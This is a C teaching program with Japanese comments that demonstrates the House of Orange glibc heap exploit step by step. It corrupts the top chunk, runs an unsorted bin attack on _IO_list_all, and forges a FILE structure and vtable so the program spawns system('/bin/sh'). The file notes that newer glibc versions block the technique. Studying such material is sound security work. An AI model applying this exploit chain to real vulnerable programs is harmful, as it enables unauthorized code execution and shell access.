#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

/*
  House of Orange は、ヒープ上のオーバーフローを使って _IO_list_all ポインタを破壊します。
  ヒープと libc のリークが必要です。
  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
*/

/*
   この関数は、関数 system のアドレスが分かっている状況を
   再現するためだけに置いています。
*/
int winner ( char *ptr);

int main()
{
    /*
      House of Orange は、ヒープ上にバッファオーバーフローがあり、
      それを使ってtop chunk(Top chunk、wilderness(Wilderness)とも呼ばれます)を破壊できる、という前提から始まります。
      
      実行開始時点では、ヒープ全体がtop chunkの一部です。
      最初の割り当ては、通常、リクエストに応えるためにtop chunkから切り出された部分です。
      したがって、割り当てのたびにtop chunkは小さくなっていきます。
      そして、top chunkのサイズが要求された値より小さくなる状況では、
      次の2つの選択肢があります。
       1) top chunkを拡張する
       2) 新しいページを mmap する

      要求サイズが 0x21000 より小さい場合は、前者が選ばれます。
    */

    char *p1, *p2;
    size_t io_list_all, *top;

    fprintf(stderr, "この手法の攻撃経路は、malloc_printerr の挙動が変更されて _IO_flush_all_lockp を呼ばなくなったことで塞がれました。"
        "91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26) を参照してください。\n");
  
    fprintf(stderr, "glibc 2.24 以降、_IO_FILE の vtable がホワイトリストと照合されるようになり、このエクスプロイトは動かなくなりました。"
        "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n");

    /*
      まず、ヒープ上にチャンク(chunk)を1つ割り当てましょう。
    */

    p1 = malloc(0x400-16);

    /*
       ヒープは通常、サイズ 0x21000 のtop chunkとして確保されます。
       すでにサイズ 0x400 のチャンクを割り当てたので、
       残りは 0x20c00 で、PREV_INUSE ビットが立つので => 0x20c01 になります。

       ヒープの境界はページ境界にアラインされています。top chunkはヒープ上の最後のチャンクなので、
       その末尾もページ境界にアラインされていなければなりません。

       また、top chunkに隣接するチャンクが解放(free)されると、
       そのチャンクはtop chunkと統合(merge)されます。そのため、top chunkの PREV_INUSE ビットは常に立っています。

       つまり、常に真でなければならない条件が2つあります。
        1) top chunkのアドレス + サイズが、ページ境界にアラインされていること
        2) top chunkの prev_inuse ビットが立っていること

       top chunkのサイズを 0xc00 | PREV_INUSE にすれば、この2つの条件を両方満たせます。
       残りは 0x20c01 です。

       では、条件を満たしましょう。
       1) top chunkのアドレス + サイズが、ページ境界にアラインされていること
       2) top chunkの prev_inuse ビットが立っていること
    */

    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;

    /* 
       次に、top chunkのサイズより大きいサイズのチャンクを要求します。
       malloc は、top chunkを拡張してこの要求に応えようとします。
       これにより sysmalloc が呼び出されます。

       通常の状況では、ヒープは次のようになっています。
          |------------|------------|------...----|
          |    chunk   |    chunk   | Top  ...    |
          |------------|------------|------...----|
      heap start                              heap end

       新しく割り当てられる領域は、古いヒープの終端に連続しています。
       したがって、top chunkの新しいサイズは、古いサイズと新たに割り当てたサイズの合計になります。

       このサイズの変化を記録するために、malloc はフェンスポスト(fencepost)チャンクを使います。
       これは基本的に一時的なチャンクです。

       top chunkのサイズが更新されると、このチャンクは解放されます。

       しかし、今回の状況では、ヒープは次のようになります。
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                            heap end

       この状況では、新しいtop chunkは、ヒープの終端に隣接するアドレスから始まります。
       そのため、2番目のチャンクとヒープの終端の間の領域は使われません。
       そして、古いtop chunkが解放されます。
       解放されるときのtop chunkのサイズは fastbin のサイズより大きいので、
       unsorted bin のリストに追加されます。
       ここで、top chunkのサイズより大きいサイズのチャンクを要求します。
       これにより sysmalloc が呼び出されます。
       そして最終的に _int_free が呼び出されます。

       最終的に、ヒープは次のようになります。
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | free ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                                             new heap end



    */

    p2 = malloc(0x1000);
    /*
      上のチャンクは、mmap された別のページに割り当てられることに注意してください。
      古いヒープの終端の後ろに置かれます。

      これで、解放されて unsorted bin のリストに追加された、古いtop chunkが残りました。


      ここから攻撃のフェーズ2が始まります。古いtop chunkへのオーバーフローがあり、
      チャンクのサイズを上書きできると仮定します。
      フェーズ2では、このオーバーフローをもう一度使って、unsorted bin のリストにある
      このチャンクの fd と bk ポインタを上書きします。
      この状態を悪用する一般的な方法は2つあります。
        - ポインタを適切に設定して、*任意の*場所に割り当てを得る(少なくとも2回の割り当てが必要です)
        - チャンクのアンリンク(unlink)を使って、libc の main_arena の unsorted-bin-list を
          *どこに*書くかを制御した書き込みを行う(少なくとも1回の割り当てが必要です)

      前者の攻撃は悪用がかなり単純なので、ここでは後者の変種、つまり上にリンクしたブログ記事で
      Angelboy が開発したものだけを詳しく説明します。

      この攻撃は、libc がヒープの不正な状態を検出したときに呼ばれる abort の呼び出し
      そのものを悪用するので、非常に見事です。
      abort が呼ばれると、_IO_flush_all_lockp を呼び出して、すべてのファイルポインタをフラッシュします。
      その過程で、_IO_list_all の連結リストをたどり、それぞれに対して _IO_OVERFLOW を呼び出します。

      狙いは、_IO_list_all ポインタを偽のファイルポインタで上書きすることです。この偽のファイルポインタは、
      _IO_OVERLOW が system を指し、先頭の8バイトが '/bin/sh' に設定されています。
      これにより、_IO_OVERFLOW(fp, EOF) の呼び出しが system('/bin/sh') になります。
      ファイルポインタの悪用については、こちらに詳しい説明があります。
      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/

      _IO_list_all のアドレスは、解放されたチャンクの fd と bk から計算できます。これらは
      現在 libc の main_arena を指しているためです。
    */

    io_list_all = top[2] + 0x9a8;

    /*
      古いtop chunkの fd と bk ポインタを上書きする予定です。
      このチャンクは、現在 unsorted bin に追加されています。

      malloc がこの空きチャンクを分割して要求に応えようとすると、
      chunk->bk->fd の値が、libc の main_arena にある unsorted-bin-list のアドレスで上書きされます。

      この上書きは健全性チェック(sanity check)より前に行われるため、
      どんな場合でも発生することに注意してください。

      ここでは、chunk->bk->fd が _IO_list_all の値になっている必要があります。
      そのため、chunk->bk を _IO_list_all - 16 に設定すればよいことになります。
    */
 
    top[3] = io_list_all - 0x10;

    /*
      最終的に、system 関数がこのファイルポインタへのポインタを引数として呼び出されます。
      先頭の8バイトを /bin/sh で埋めておけば、system(/bin/sh) と同等になります。
    */

    memcpy( ( char *) top, "/bin/sh\x00", 8);

    /*
      関数 _IO_flush_all_lockp は、_IO_list_all にあるファイルポインタの連結リストを
      順にたどります。
      このアドレスは main_arena の unsorted-bin-list でしか上書きできないので、
      対応する fd ポインタの位置にあるメモリを制御することを狙います。
      次のファイルポインタのアドレスは base_address+0x68 にあります。
      これは small bin-4 に対応し、small bin-4 はサイズが 90 から 98 の間の
      すべての small bin を保持します。libc の bin の構成についての詳細は、
      こちらを参照してください: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/

      古いtop chunkをオーバーフローさせるので、そのサイズフィールドも制御できます。
      ここが少し厄介なところです。現在、古いtop chunkは
      unsorted bin のリストにあります。割り当てのたびに、malloc はまずこのリストにある
      チャンクで要求に応えようとするため、リストを順にたどります。
      さらに、合わないチャンクはすべて対応する bin に振り分けます(sort)。
      サイズを 0x61 (97) に設定し(prev_inuse ビットは立てておく必要があります)、
      合わない、より小さい割り当てを発生させると、malloc は古いチャンクを
      small bin-4 に振り分けます。この bin は現在空なので、古いtop chunkが新しい先頭になり、
      main_arena の small bin[4] の位置を占め、
      結果として偽のファイルポインタの fd ポインタを表すことになります。

      malloc は振り分けのほかに、それらに対していくつかのサイズチェックも行います。
      そのため、古いtop chunkを振り分けた後、不正な fd ポインタをたどって
      _IO_list_all に行くと、対応するサイズフィールドを調べ、
      サイズが MINSIZE より小さい "size <= 2 * SIZE_SZ" ことを検出して、
      最終的に abort の呼び出しが引き起こされ、一連の連鎖が動き出します。
      libc の対応するコードはこちらです。
      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
    */

    top[1] = 0x61;

    /*
      ここからは、関数 _IO_flush_all_lockp が要求する偽のファイルポインタの制約を
      満たす部分です。制約のテストはこちらで行われています。
      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813

      1つ目の条件を満たしたいと思います。
      fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
    */

    FILE *fp = (FILE *) top;


    /*
      1. mode を 0 に設定する: fp->_mode <= 0
    */

    fp->_mode = 0; // top+0xc0


    /*
      2. write_base を 2、write_ptr を 3 に設定する: fp->_IO_write_ptr > fp->_IO_write_base
    */

    fp->_IO_write_base = (char *) 2; // top+0x20
    fp->_IO_write_ptr = (char *) 3; // top+0x28


    /*
      4) 最後に、ジャンプテーブル(jump table)を制御可能なメモリに設定し、そこに system を置きます。
      ジャンプテーブルへのポインタは FILE 構造体のすぐ後ろにあります。
      base_address+sizeof(FILE) = jump_table

         4-a)  _IO_OVERFLOW はオフセット 3 のポインタを呼び出します: jump_table+0x18 == winner
    */

    size_t *jump_table = &top[12]; // controlled memory
    jump_table[3] = (size_t) &winner;
    *(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table; // top+0xd8


    /* 最後に、malloc を呼び出して一連の連鎖全体を発動させます */
    malloc(10);

   /*
     libc のエラーメッセージが画面に表示されます。
     しかし、いずれにせよシェルが得られます。
   */

    return 0;
}

int winner(char *ptr)
{ 
    system(ptr);
    syscall(SYS_exit, 0);
    return 0;
}
